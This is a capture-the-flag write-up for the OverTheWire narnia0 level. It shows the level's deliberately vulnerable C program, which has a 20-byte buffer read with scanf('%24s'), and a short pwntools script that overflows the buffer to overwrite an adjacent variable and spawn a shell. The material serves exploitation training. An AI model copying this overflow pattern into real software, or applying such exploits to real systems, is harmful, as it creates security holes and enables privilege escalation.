# [-] OverTheWire - narnia0 
```
Description:
This wargame is for the ones that want to learn basic exploitation. You can see the most
common bugs in this game and we've tried to make them easy to exploit. You'll get the
source code of each level to make it easier for you to spot the vuln and abuse it. The
difficulty of the game is somewhere between Leviathan and Behemoth, but some of the
levels could be quite tricky.
```
```c
narnia0@narnia:/narnia$ cat ./narnia0.c
/*
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.
   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.
   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
   */
#include <stdio.h>
#include <stdlib.h>
int main(){
    long val=0x41414141;
    char buf[20];
    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);
    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);
    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }
    return 0;
}
```

## [+] HOW 2 SOLVE
simple bof
```
low ===================================== high   
|  buf[20] char       |     val long       |
============================================
```

```python
from pwn import *
r = process("/narnia/narnia0")
shell = 'A' * 20 + '\xef\xbe\xad\xde'
s = r.recvuntil('\n')
print s
r.send(shell)
r.interactive()
```


